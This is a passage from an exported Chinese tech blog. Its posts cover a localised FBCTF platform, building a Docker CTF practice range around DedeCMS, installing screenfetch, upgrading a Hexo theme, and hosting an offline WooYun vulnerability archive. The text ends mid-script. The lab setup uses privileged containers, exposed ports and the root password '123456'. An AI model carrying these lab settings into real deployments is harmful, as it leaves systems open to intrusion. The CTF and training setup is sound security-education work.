      <url>/p/fad0.html</url>
      
        <content type="html"><![CDATA[<p>适用于FBCTF Ubuntu 16.04版本的</p><span id="more"></span><p>汉化+做了点美化+修复个BUG<br>直接上图</p><h1 id="首页"><a href="#首页" class="headerlink" title="首页"></a>首页</h1><p><img src="/images/P7gGvn1.jpg"></p><h1 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h1><p><img src="/images/M7ZzWUV.jpg"></p><h1 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h1><p><img src="/images/gEgXehw.jpg"></p><h1 id="后台"><a href="#后台" class="headerlink" title="后台"></a>后台</h1><p><img src="/images/9IC3kXI.jpg"></p><h1 id="游戏版图"><a href="#游戏版图" class="headerlink" title="游戏版图"></a>游戏版图</h1><p><img src="/images/65Jr75Q.jpg"></p><h1 id="计分板"><a href="#计分板" class="headerlink" title="计分板"></a>计分板</h1><p><img src="/images/VhH2DMO.jpg"></p><p><a href="https://github.com/NS-Sp4ce/FBCTF-Chinese-Version">下载地址</a><a href="https://github.com/NS-Sp4ce/FBCTF-Chinese-Version">https://github.com/NS-Sp4ce/FBCTF-Chinese-Version</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu 16.04搭建适用于CTF的Docker靶场</title>
      <link href="/p/1191.html"/>
      <url>/p/1191.html</url>
      
        <content type="html"><![CDATA[<p>因CTF比赛需要和设备闲置 学习搭建Docker靶场</p><span id="more"></span><h1 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h1><ul><li>OS: Ubuntu 16.04</li><li>设备类型: VM</li><li>宿主机：ESXI 6.5</li></ul><h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><h2 id="卸载原有Docker"><a href="#卸载原有Docker" class="headerlink" title="卸载原有Docker"></a>卸载原有Docker</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">apt-get remove docker \</span></span><br><span class="line"><span class="language-bash">    docker-engine \</span></span><br><span class="line"><span class="language-bash">    docker.io</span></span><br></pre></td></tr></table></figure><p><img src="/images/a5LkcZg.jpg"></p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>Ubuntu 16.04 + 上的 Docker CE 默认使用<code>overlay2</code>存储层驱动,无需手动配置。</p><h2 id="使用-APT-安装"><a href="#使用-APT-安装" class="headerlink" title="使用 APT 安装"></a>使用 APT 安装</h2><p>由于<code>apt</code>源使用 HTTPS 以确保软件下载过程中不被篡改。因此，我们首先需要添加使用 HTTPS 传输的软件包以及 CA 证书。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">apt-get update -y &amp;&amp; apt-get upgrade -y</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">apt-get install \</span></span><br><span class="line"><span class="language-bash">    apt-transport-https \</span></span><br><span class="line"><span class="language-bash">    ca-certificates \</span></span><br><span class="line"><span class="language-bash">    curl \</span></span><br><span class="line"><span class="language-bash">    software-properties-common</span></span><br></pre></td></tr></table></figure><p><img src="/images/YHNIN9a.jpg"></p><p>鉴于国内网络问题，建议使用国内源，官方源请在注释中查看。<br>为了确认所下载软件包的合法性，需要添加软件源的 GPG 密钥。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">官方源</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span></span><br></pre></td></tr></table></figure><p><img src="/images/Mwaqx2C.jpg"></p><p>然后，我们需要向 source.list 中添加 Docker 软件源</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">sudo add-apt-repository \</span></span><br><span class="line"><span class="language-bash">    <span class="string">&quot;deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">    <span class="subst">$(lsb_release -cs)</span> \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">    stable&quot;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">官方源</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">$ sudo add-apt-repository \</span></span><br><span class="line"><span class="language-bash"><span class="comment">#    &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \</span></span></span><br><span class="line"><span class="language-bash"><span class="comment">#    $(lsb_release -cs) \</span></span></span><br><span class="line"><span class="language-bash"><span class="comment">#    stable&quot;</span></span></span><br></pre></td></tr></table></figure><p><img src="/images/BpFZjdA.jpg"></p><blockquote><p>以上命令会添加稳定版本的 Docker CE APT 镜像源，如果需要测试或每日构建版本的 Docker CE 请将 stable 改为 test 或者 nightly。</p></blockquote><h1 id="安装-Docker-CE"><a href="#安装-Docker-CE" class="headerlink" title="安装 Docker CE"></a>安装 Docker CE</h1><p>更新 apt 软件包缓存，并安装 docker-ce：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">sudo apt-get update</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">sudo apt-get install docker-ce</span></span><br></pre></td></tr></table></figure><p><img src="/images/gvIGirC.jpg"></p><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><blockquote><p>使用脚本自动安装<br>在测试或开发环境中 Docker 官方为了简化安装流程，提供了一套便捷的安装脚本，Ubuntu 系统上可以使用这套脚本安装：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">curl -fsSL get.docker.com -o get-docker.sh</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">sudo sh get-docker.sh --mirror Aliyun</span></span><br></pre></td></tr></table></figure><p>执行这个命令后，脚本就会自动的将一切准备工作做好，并且把 Docker CE 的 Edge 版本安装在系统中。</p></blockquote><h1 id="启动-Docker-CE"><a href="#启动-Docker-CE" class="headerlink" title="启动 Docker CE"></a>启动 Docker CE</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">sudo systemctl <span class="built_in">enable</span> docker</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">sudo systemctl start docker</span></span><br></pre></td></tr></table></figure><p><img src="/images/SKw6fEP.jpg"></p><h1 id="建立-docker-用户组"><a href="#建立-docker-用户组" class="headerlink" title="建立 docker 用户组"></a>建立 docker 用户组</h1><p>默认情况下，docker 命令会使用 Unix socket 与 Docker 引擎通讯。而只有 root 用户和 docker 组的用户才可以访问 Docker 引擎的 Unix socket。出于安全考虑，一般 Linux 系统上不会直接使用 root 用户。因此，更好地做法是将需要使用 docker 的用户加入 docker 用户组。</p><h2 id="建立-docker-组："><a href="#建立-docker-组：" class="headerlink" title="建立 docker 组："></a>建立 docker 组：</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">sudo groupadd docker</span></span><br></pre></td></tr></table></figure><h2 id="将当前用户加入-docker-组："><a href="#将当前用户加入-docker-组：" class="headerlink" title="将当前用户加入 docker 组："></a>将当前用户加入 docker 组：</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">sudo usermod -aG docker <span class="variable">$USER</span></span></span><br></pre></td></tr></table></figure><p><img src="/images/5AjlXQq.png"></p><p>退出当前终端并重新登录，进行如下测试。</p><h1 id="测试-Docker-是否安装正确"><a href="#测试-Docker-是否安装正确" class="headerlink" title="测试 Docker 是否安装正确"></a>测试 Docker 是否安装正确</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">docker run hello-world</span></span><br><span class="line"></span><br><span class="line">Unable to find image &#x27;hello-world:latest&#x27; locally</span><br><span class="line">latest: Pulling from library/hello-world</span><br><span class="line">d1725b59e92d: Pull complete</span><br><span class="line">Digest: sha256:0add3ace90ecb4adbf7777e9aacf18357296e799f81cabc9fde470971e499788</span><br><span class="line">Status: Downloaded newer image for hello-world:latest</span><br><span class="line"></span><br><span class="line">Hello from Docker!</span><br><span class="line">This message shows that your installation appears to be working correctly.</span><br><span class="line"></span><br><span class="line">To generate this message, Docker took the following steps:</span><br><span class="line"> 1. The Docker client contacted the Docker daemon.</span><br><span class="line"> 2. The Docker daemon pulled the &quot;hello-world&quot; image from the Docker Hub.</span><br><span class="line">    (amd64)</span><br><span class="line"> 3. The Docker daemon created a new container from that image which runs the</span><br><span class="line">    executable that produces the output you are currently reading.</span><br><span class="line"> 4. The Docker daemon streamed that output to the Docker client, which sent it</span><br><span class="line">    to your terminal.</span><br><span class="line"></span><br><span class="line">To try something more ambitious, you can run an Ubuntu container with:</span><br><span class="line"><span class="meta"> $ </span><span class="language-bash">docker run -it ubuntu bash</span></span><br><span class="line"></span><br><span class="line">Share images, automate workflows, and more with a free Docker ID:</span><br><span class="line"> https://hub.docker.com/</span><br><span class="line"></span><br><span class="line">For more examples and ideas, visit:</span><br><span class="line"> https://docs.docker.com/get-started/</span><br></pre></td></tr></table></figure><p><img src="/images/AQ8nP3B.jpg"><br>若能正常输出以上信息，则说明安装成功。</p><blockquote><p>参考<br><a href="https://yeasy.gitbooks.io/docker_practice/install/ubuntu.html">https://yeasy.gitbooks.io/docker_practice/install/ubuntu.html</a></p></blockquote><h1 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h1><p>先搭建一个WEB容器练练手 理解下端口映射的原理<br>操作过程：</p><h2 id="第一步：准备工作"><a href="#第一步：准备工作" class="headerlink" title="第一步：准备工作"></a>第一步：准备工作</h2><ul><li>根目录： &#x2F;opt&#x2F;docker</li><li>网站根目录：&#x2F;opt&#x2F;docker&#x2F;www</li><li>nginx相关目录：&#x2F;opt&#x2F;docker&#x2F;nginx&#x2F;conf.d</li></ul><h2 id="第二步：安装php7-nginx-mysql"><a href="#第二步：安装php7-nginx-mysql" class="headerlink" title="第二步：安装php7,nginx,mysql"></a>第二步：安装php7,nginx,mysql</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//拉取nginx镜像  </span><br><span class="line">docker pull nginx  </span><br><span class="line">//拉取php镜像  </span><br><span class="line">docker pull php:7.1.0-fpm  </span><br><span class="line">//拉取mysql镜像  </span><br><span class="line">docker pull mysql:5.7.18</span><br></pre></td></tr></table></figure><blockquote><p><strong>注意！</strong><br>mysql务必加上版本号 否则会拉取MySQL8.0的镜像下来导致后面各种奇奇怪怪的错</p></blockquote><h2 id="第三步：启动基础环境"><a href="#第三步：启动基础环境" class="headerlink" title="第三步：启动基础环境"></a>第三步：启动基础环境</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//启动php  </span><br><span class="line">docker run -p 9000:9000 --name php -v /opt/docker/www/:/var/www/html/ --privileged=true -d php:7.1.0-fpm  </span><br><span class="line">//启动nginx  </span><br><span class="line">docker run -p 80:80 --name nginx -v /opt/docker/www/:/usr/share/nginx/html/ -v /opt/docker/nginx/conf.d:/etc/nginx/conf.d --privileged=true -d nginx  </span><br><span class="line">//启动mysql  </span><br><span class="line">docker run -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 --name mysql5 -v /opt/docker/mysql-5.7.18/data:/var/lib/mysql -d mysql:5.7.18</span><br></pre></td></tr></table></figure><p><img src="/images/MPGUGI5.jpg"></p><p><img src="/images/qpBFhag.jpg"></p><blockquote><p>命令详解<br>-v &#x2F;opt&#x2F;docker&#x2F;www&#x2F;:&#x2F;var&#x2F;www&#x2F;html&#x2F;：把宿主机（Ubuntu）的&#x2F;opt&#x2F;docker&#x2F;www&#x2F;挂载到了docker的&#x2F;var&#x2F;www&#x2F;html&#x2F;<br>–name php 命名为php<br>-p 80:80 把宿主机的80映射到docker的80端<br>-e MYSQL_ROOT_PASSWORD&#x3D;123456 设置MySQL密码为123456</p></blockquote><h2 id="测试环境是否正确"><a href="#测试环境是否正确" class="headerlink" title="测试环境是否正确"></a>测试环境是否正确</h2><p>编辑文件<code>/opt/docker/www/index.php</code></p><figure class="highlight plaintext"><figcaption><span>[index.php]</span></figcaption><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>然后在宿主机目录<code>/opt/docker/nginx/conf.d/</code>新建<code>index.conf</code><br>内容如下</p><figure class="highlight plaintext"><figcaption><span>[/opt/docker/nginx/conf.d/index.conf]</span></figcaption><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">  listen  80;</span><br><span class="line">  #server_name www.test.com;</span><br><span class="line">  root   /usr/share/nginx/html/;#nginx映射的地址</span><br><span class="line">  location / &#123;</span><br><span class="line">   index index.html index.htm index.php;</span><br><span class="line">   autoindex off;</span><br><span class="line">  &#125;</span><br><span class="line">  location ~ \.php(.*)$ &#123;</span><br><span class="line">   root   /var/www/html/;#php映射的地址 同时定义为$document_root</span><br><span class="line">   fastcgi_pass 172.17.0.2:9000;</span><br><span class="line">   fastcgi_index index.php;</span><br><span class="line">   fastcgi_split_path_info ^((?U).+\.php)(/?.+)$;</span><br><span class="line">   fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class="line">   fastcgi_param PATH_INFO $fastcgi_path_info;</span><br><span class="line">   fastcgi_param PATH_TRANSLATED $document_root$fastcgi_path_info;</span><br><span class="line">   include  fastcgi_params;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后重启<code>nginx</code> docker</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker restart nginx</span><br></pre></td></tr></table></figure><p>访问10.16.11.231【你部署Docker的机器的地址】查看是否输出PHPINFO<br><img src="/images/WVL4mhf.png"><br>如图即为成功</p><h2 id="第四步：安装-amp-部署靶机"><a href="#第四步：安装-amp-部署靶机" class="headerlink" title="第四步：安装&amp;部署靶机"></a>第四步：安装&amp;部署靶机</h2><p>以DeDeCMS为例<br>先拉取有dedemcms的镜像</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull chengxulvtu/dedecms:utf8_full_5.7  </span><br><span class="line">docker run -d --name dede-lantinghe -p 8081:80 -v /opt/docker/www/dedecms:/var/www/html chengxulvtu/dedecms:utf8_full_5.7</span><br></pre></td></tr></table></figure><p>然后访问<code>10.16.11.231:8081</code>进行常规安装即可</p><p><img src="/images/onYQd6l.png"></p><p>然后kill掉该docker并rm掉，FTP连接到宿主机找到安装好dedecms的目录<code>/opt/docker/www/dedecms</code>,在目录下创建一个新的文件夹（这里我用的<code>src</code>）并把dedecms的<strong>所有文件</strong>移入<code>src</code>文件夹内，再在<code>/opt/docker/www/dedecms</code>新建一个<code>Dockerfile</code>文件，操作后的<code>/opt/docker/www/dedecms</code>目录应该类似这样</p><p><img src="/images/nxEomxh.jpg"></p><p>编辑<code>Dockerfile</code>文件内容如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FROM eboraas/apache-php:latest</span><br><span class="line"></span><br><span class="line">COPY src/ /var/www/html/</span><br><span class="line"></span><br><span class="line">RUN rm /var/www/html/index.html \</span><br><span class="line">&amp;&amp; chmod -R 755 /var/www/html</span><br></pre></td></tr></table></figure><p>解释下每行命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FROM &lt;image&gt;或 </span><br><span class="line">FROM &lt;image&gt;:&lt;tag&gt;</span><br></pre></td></tr></table></figure><p>在Dockerfile中第一条非注释INSTRUCTION一定是FROM，它决定了以哪一个镜像作为基准，<code>&lt;image&gt;</code>首选本地是否存在，如果不存在则会从公共仓库下载（当然也可以使用私有仓库的格式）。这里引用了<code>eboraas</code>最新的<code>apache-php</code>集成环境</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">COPY &lt;src&gt; &lt;dest&gt;</span><br></pre></td></tr></table></figure><p>将文件<code>&lt;src&gt;</code>拷贝到<code>container</code>的文件系统对应的路径<code>&lt;dest&gt;</code>下。<br>其中<br><code>&lt;src&gt;</code>可以是文件、文件夹，对于文件和文件夹<code>&lt;src&gt;</code>必须是在Dockerfile的相对路径下，即只能是相对路径且不能包含<code>../path/</code>。<br><code>&lt;dest&gt;</code>只能是容器中的绝对路径。如果路径不存在则会自动级联创建，根据你的需要是<code>&lt;dest&gt;</code>里是否需要反斜杠<code>/</code>，习惯使用<code>/</code>结尾从而避免被当成文件。<br>与<code>ADD</code>命令相比,<code>ADD</code>支持远程URL获取文件，但官方认为是<code>strongly discouraged</code>，建议使用<code>wget</code>或<code>curl</code>代替。<br><code>COPY</code>的语法与功能与<code>ADD</code>相同，只是不支持上面讲到的<code>&lt;src&gt;</code>是远程URL、自动解压这两个特性，但是<code>Best Practices for Writing Dockerfiles</code>建议尽量使用<code>COPY</code>，并使用<code>RUN</code>与<code>COPY</code>的组合来代替<code>ADD</code>，这是因为虽然<code>COPY</code>只支持本地文件拷贝到<code>container</code>，但它的处理比<code>ADD</code>更加透明，建议只在复制<code>tar</code>文件时使用<code>ADD</code>，如<code>ADD trusty-core-amd64.tar.gz /</code>，会先自动解压内容再<code>COPY</code>到在容器的<code>/</code>目录下。<br>在本例中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">COPY src/ /var/www/html/</span><br></pre></td></tr></table></figure><p>复制相对于<code>Dockerfile</code>文件位置的<code>src/</code>下的所有内容到<code>/var/www/html/</code>下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RUN &lt;commnad&gt;</span><br><span class="line">RUN [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot;]</span><br></pre></td></tr></table></figure><p><code>RUN</code>指令会在当前镜像的顶层执行任何命令，并<code>commit</code>成新的（中间）镜像，提交的镜像会在后面继续用到。<br>另外<code>RUN</code>命令的格式有两种写法。<br><code>shell</code>格式，相当于执行<code>/bin/sh -c &quot;&lt;command&gt;&quot;</code>：<br><code>RUN apt-get install vim -y</code><br><code>exec</code>格式，不会触发shell，所以<code>$HOME</code>这样的环境变量无法使用，但它可以在没有bash的镜像中执行，而且可以避免错误的解析命令字符串：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RUN [&quot;apt-get&quot;, &quot;install&quot;, &quot;vim&quot;, &quot;-y&quot;]</span><br><span class="line">或</span><br><span class="line">RUN [&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;apt-get install vim -y&quot;] </span><br></pre></td></tr></table></figure><p>功能与shell风格相同</p><h3 id="配置Flag项"><a href="#配置Flag项" class="headerlink" title="配置Flag项"></a>配置Flag项</h3><p>进入<code>src</code>目录，配置你需要的<code>Flag</code>项目，然后就可以打包了</p><h2 id="第五步：打包【制作】CTF用镜像"><a href="#第五步：打包【制作】CTF用镜像" class="headerlink" title="第五步：打包【制作】CTF用镜像"></a>第五步：打包【制作】CTF用镜像</h2><h3 id="打包成镜像"><a href="#打包成镜像" class="headerlink" title="打包成镜像"></a>打包成镜像</h3><p>创建完上面的<code>Dockerfile</code>后在当前目录执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build -t ctf:list1 .</span><br></pre></td></tr></table></figure><p>命令原型</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build [OPTIONS] PATH | URL | -</span><br></pre></td></tr></table></figure><p>稍等片刻就可以运行<code>docker images</code>指令并能看到名为<code>ctf</code>,<code>TAG</code>为list1的镜像了</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux安装screenfetch</title>
      <link href="/p/9196.html"/>
      <url>/p/9196.html</url>
      
        <content type="html"><![CDATA[<p>screenFetch 是一个能够在截屏中显示系统&#x2F;主题信息的命令行脚本。它可以在 Linux，OS X，FreeBSD 以及其它的许多类Unix系统上使用。</p><span id="more"></span><h1 id="Ubuntu系"><a href="#Ubuntu系" class="headerlink" title="Ubuntu系"></a>Ubuntu系</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install screenfetch</span><br></pre></td></tr></table></figure><p>如果源里面没有这个软件，可以采用如下方法：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://github.com/KittyKatt/screenFetch/archive/master.zip</span><br><span class="line">unzip master.zip</span><br><span class="line">sudo mv screenFetch-master/screenfetch-dev /usr/bin/screenfetch</span><br></pre></td></tr></table></figure><p>如图</p><p><img src="/images/VuwwG8E.png"></p><h1 id="RHEL系"><a href="#RHEL系" class="headerlink" title="RHEL系"></a>RHEL系</h1><p>如图</p><p><img src="/images/qKduYnE.png"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>更新Next主题</title>
      <link href="/p/cab3.html"/>
      <url>/p/cab3.html</url>
      
        <content type="html"><![CDATA[<p>没注意NeXT已经更新到6.5.0版本了<br>折腾之余顺便记录下</p><span id="more"></span><p>NeXT 6系列和5系列给笔者最直观的感受是配置文件更细了，更细带来的问题是一些JS库需要自己去下载了。。</p><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>适用于从5.X升级上来的</p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>cd到博客目录然后</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/theme-next/hexo-theme-next themes/next-reloaded</span><br></pre></td></tr></table></figure><h2 id="启用"><a href="#启用" class="headerlink" title="启用"></a>启用</h2><p>在 Hexo 的主配置文件中设置主题：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">theme: next-reloaded</span><br></pre></td></tr></table></figure><p>NeXT6.X主题将在生成站点时被加载。如果你遇到了任何错误、或只是不喜欢这一新版本，你可以随时切换回旧的 v5.1.x 版本。</p><h1 id="迁移设置"><a href="#迁移设置" class="headerlink" title="迁移设置"></a>迁移设置</h1><p>正如笔者前文所述，6.X的配置文件更细了</p><h2 id="更新语言配置"><a href="#更新语言配置" class="headerlink" title="更新语言配置"></a>更新语言配置</h2><p>从 v6.0.3版本起，zh-Hans改名为zh-CN，需要在修改<strong>HEXO</strong>配置文件<code>_config.xml</code>里的<code>language</code>配置，否则语言显示不正确。</p><figure class="highlight plaintext"><figcaption><span>[例子]</span></figcaption><table><tr><td class="code"><pre><span class="line"># Hexo Configuration</span><br><span class="line">## Docs: https://hexo.io/docs/configuration.html</span><br><span class="line">## Source: https://github.com/hexojs/hexo/</span><br><span class="line"></span><br><span class="line"># Site</span><br><span class="line">..........</span><br><span class="line">language: zh-CN #注意此处 zh-Hans-&gt;zh-CN</span><br><span class="line">timezone: Asia/Shanghai</span><br><span class="line">..........</span><br><span class="line"># URL</span><br><span class="line">## If your site is put in a subdirectory, set url as &#x27;http://yoursite.com/child&#x27; and root as &#x27;/child/&#x27;</span><br></pre></td></tr></table></figure><p>然后就是更新下styl文件了，官方从<code>5.*</code>-&gt;<code>6.*</code>的样式更改没多少</p><h1 id="更新后的操作"><a href="#更新后的操作" class="headerlink" title="更新后的操作"></a>更新后的操作</h1><p>更新后执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br></pre></td></tr></table></figure><p>即可使用最新主题了</p><h1 id="真香"><a href="#真香" class="headerlink" title="真香"></a>真香</h1><p>顺便加了个评论功能<br>嗯~~~真香！</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建乌云漏洞库+知识库</title>
      <link href="/p/f243.html"/>
      <url>/p/f243.html</url>
      
        <content type="html"><![CDATA[<p>乌云2年多了。。突发奇想在内网搭建个知识库+漏洞库</p><span id="more"></span><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>为了方便，我用了Windows服务器，详细配置如下</p><h2 id="服务器配置"><a href="#服务器配置" class="headerlink" title="服务器配置"></a>服务器配置</h2><blockquote><p>Windows Server 2016 DC<br>Apache 2.4.25<br>PHP 5.6.30<br>MySQL 5.7.17-log</p></blockquote><h2 id="所需文件下载地址"><a href="#所需文件下载地址" class="headerlink" title="所需文件下载地址"></a>所需文件下载地址</h2><blockquote><p>知识库：<br>链接：<a href="https://pan.baidu.com/s/1CZVZxdHzl7L8y3dGWN-aOQ">https://pan.baidu.com/s/1CZVZxdHzl7L8y3dGWN-aOQ</a><br>提取码：uuuo<br>漏洞库<br>链接：<a href="https://pan.baidu.com/s/1LGSwDmVwtlffyM8I-1hQzw">https://pan.baidu.com/s/1LGSwDmVwtlffyM8I-1hQzw</a><br>提取码：8duw</p></blockquote><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><h2 id="漏洞库"><a href="#漏洞库" class="headerlink" title="漏洞库"></a>漏洞库</h2><ol><li>将漏洞库中的<code>wooyun</code>目录下所有文件移入mysql的data目录，然后查看数据库中是否存在名称为wooyun的数据库库和bugs、whitehats的数据表<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt; </span><span class="language-bash">SHOW DATABASES;</span></span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">| wooyun             |</span><br><span class="line">+--------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"><span class="meta">mysql&gt; </span><span class="language-bash">use wooyun</span></span><br><span class="line">Database changed</span><br><span class="line"><span class="meta">mysql&gt; </span><span class="language-bash">SHOW TABLES;</span></span><br><span class="line">+------------------+?</span><br><span class="line">| Tables_in_wooyun |</span><br><span class="line">+------------------+</span><br><span class="line">| bugs             |</span><br><span class="line">| whitehats        |</span><br><span class="line">+------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></li><li>更改bugs\conn.php的内容为你数据库信息</li><li>访问查看查看是否正常，如页面显示报错信息，删掉那一行即可<h2 id="知识库"><a href="#知识库" class="headerlink" title="知识库"></a>知识库</h2>知识库均为静态内容，为了方便浏览，写了个python脚本插入数据库<br>在wooyun数据库新建个drops表，SQL如下</li></ol><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `drops` (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `title` text <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `link` text <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`)</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB AUTO_INCREMENT<span class="operator">=</span><span class="number">1270</span> <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8</span><br></pre></td></tr></table></figure><p>Python脚本如下（Python 3）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Date    : 2018-10-15 14:21:13</span></span><br><span class="line"><span class="comment"># @Author  : Sp4ce</span></span><br><span class="line"><span class="comment"># @Github  : https://github.com/NS-Sp4ce</span></span><br><span class="line"><span class="comment"># @Version : 1.0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;&quot;</span>  <span class="comment"># 乌云知识库文件夹目录</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getFiles</span>(<span class="params">path</span>):</span><br><span class="line">    dirs = os.listdir(path)  <span class="comment"># 得到文件夹下的所有文件名称</span></span><br><span class="line">    <span class="comment">#print(dirs)</span></span><br><span class="line">    file = []</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">dir</span> <span class="keyword">in</span> dirs:  <span class="comment"># 遍历文件夹</span></span><br><span class="line">        file.append(<span class="built_in">dir</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="comment"># print(files)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;文件夹读取完毕，共有&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;个文件&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> file <span class="comment">#返回file</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">insertDB</span>(<span class="params">string</span>):</span><br><span class="line">    url=<span class="string">&#x27;/content/&#x27;</span>+titles</span><br><span class="line">    conn=pymysql.connect(host=<span 